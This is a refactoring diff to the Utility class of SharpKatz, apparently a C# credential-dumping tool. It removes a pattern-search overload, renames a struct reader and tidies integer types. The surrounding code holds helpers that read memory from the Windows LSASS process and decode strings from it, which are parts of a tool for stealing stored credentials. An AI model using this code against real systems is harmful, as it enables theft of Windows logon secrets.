@@ -16,33 +16,6 @@ namespace SharpKatz
 {
     class Utility
     {
-        public static ulong SearchPattern(byte[] mem, byte[] signature)
-        {
-            ulong offset = 0;
-            ulong memlen = (ulong)mem.Length;
-            ulong signlen = (ulong)signature.Length;
-
-            for (ulong i = 0; i < memlen; i++)
-            {
-                for (uint j = 0; j < signlen; j++)
-                {
-                    if (signature[j] != mem[i + j])
-                    {
-                        break;
-                    }
-                    else
-                    {
-                        if (j == (signlen - 1))
-                        {
-                            offset = i;
-                            return offset;
-                        }
-                    }
-                }
-            }
-
-            return offset;
-        }
 
         public static ulong SearchPattern(IntPtr mem, byte[] signature, long max_search_size)
         {
@@ -83,8 +56,7 @@ namespace SharpKatz
                 Console.WriteLine("[x] Error: Could not load {0} into local process", modulename);
                 return 0;
             }
-
-            //return SearchPattern(tmpbytes, sign);
+            
             return SearchPattern(moduleLocal, sign, max_search_size);
         }
 
@@ -148,7 +120,6 @@ namespace SharpKatz
             return GetIntPtr( hLsass,  msvMem, listSignOffset, listOffset);
         }
 
-        // Read memory from LSASS process
         public static byte[] ReadFromLsass(ref IntPtr hLsass, IntPtr addr, ulong bytesToRead)
         {
             int bytesRead = 0;
@@ -192,7 +163,7 @@ namespace SharpKatz
             return sid_b;
         }
 
-        public static T ReadStructFromLocalPtr<T>(IntPtr addr)
+        public static T ReadStruct<T>(IntPtr addr)
             where T : struct
         {
             T str = (T)Marshal.PtrToStructure(addr, typeof(T));
@@ -218,7 +189,7 @@ namespace SharpKatz
             }
 
             // Read the buffer contents for the LSA_UNICODE_STRING from lsass memory
-            byte[] resultBytes = ReadFromLsass(ref hLsass, str.Buffer, (ulong)str.MaximumLength);
+            byte[] resultBytes = ReadFromLsass(ref hLsass, str.Buffer, str.MaximumLength);
             UnicodeEncoding encoder = new UnicodeEncoding(false, false, true);
             try
             {
@@ -238,7 +209,7 @@ namespace SharpKatz
             }
 
             // Read the buffer contents for the LSA_UNICODE_STRING from lsass memory
-            byte[] resultBytes = ReadFromLsass(ref hLsass, str.Buffer, (ulong)str.MaximumLength);
+            byte[] resultBytes = ReadFromLsass(ref hLsass, str.Buffer, str.MaximumLength);
 
             GCHandle pinnedArray = GCHandle.Alloc(resultBytes, GCHandleType.Pinned);
             IntPtr tmp_p = pinnedArray.AddrOfPinnedObject();
@@ -471,8 +442,8 @@ namespace SharpKatz
             IntPtr lpValue = Marshal.AllocHGlobal(Marshal.SizeOf(tk));
             Marshal.StructureToPtr(tk, lpValue, false);
 
-            UInt32 tokenInformationLength = (UInt32)Marshal.SizeOf(typeof(TOKEN_ELEVATION));
-            UInt32 returnLength;
+            uint tokenInformationLength = (uint)Marshal.SizeOf(typeof(TOKEN_ELEVATION));
+            uint returnLength;
 
             Boolean result = GetTokenInformation(
                 hToken,
